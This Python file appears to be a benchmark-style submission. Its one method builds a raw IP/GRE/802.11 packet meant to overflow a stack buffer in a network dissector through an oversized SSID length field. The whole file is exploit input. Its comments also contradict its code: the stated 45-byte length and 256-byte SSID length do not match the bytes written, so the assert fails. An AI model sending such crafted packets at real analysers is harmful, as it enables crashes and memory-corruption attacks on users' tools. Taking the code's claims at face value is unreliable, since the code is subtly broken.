class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal crafted PoC for GRE-encapsulated 802.11 frame triggering stack buffer overflow
        # Total length: 45 bytes (raw IP/GRE/802.11 payload)
        # IP header (20 bytes): minimal, proto GRE (47)
        # GRE header (4 bytes): flags/version 0x2000 (to misalign phdr for large garbage length), proto 0x0000 (assuming raw for 802.11 trigger)
        # 802.11 payload (21 bytes): malformed frame with large SSID length (0x100) to overflow stack buffer in dissector
        ip_header = b'\x45\x00\x00\x29\x12\x34\x00\x00\x40\x2f\x11\x22\xc0\xa8\x01\x01\xc0\xa8\x01\x02'
        # IP checksum placeholder (will be invalid, but reaches GRE)
        gre_header = b'\x20\x00\x00\x00'  # flags 0x2000, version 0, proto 0x0000
        # 802.11 frame: management frame with large length field
        # FC: 0x80 (beacon-like), duration 0, DA/BSSID/SA minimal, seq 0
        # Timestamp 8B 0, interval 0, cap 0, SSID tag 0, length 0x0100 (large), then filler
        ieee80211_payload = (
            b'\x80\x00'  # Frame control
            b'\x00\x00'  # Duration
            b'\xff\xff\xff\xff\xff\xff'  # DA
            b'\x00\x11\x22\x33\x44\x55'  # SA
            b'\x00\x11\x22\x33\x44\x55'  # BSSID
            b'\x00\x00'  # Seq
            b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Timestamp
            b'\x00\x00'  # Beacon interval
            b'\x00\x00'  # Capability
            b'\x00\x01'  # SSID tag, length (LE 16-bit for large: 0x0100 = 256)
            b'\x00'  # Start of SSID filler (actual data short, but length large)
            b'\x41' * 12  # Filler 'A's to reach 21 bytes total payload
        )
        poc = ip_header + gre_header + ieee80211_payload
        assert len(poc) == 45
        return poc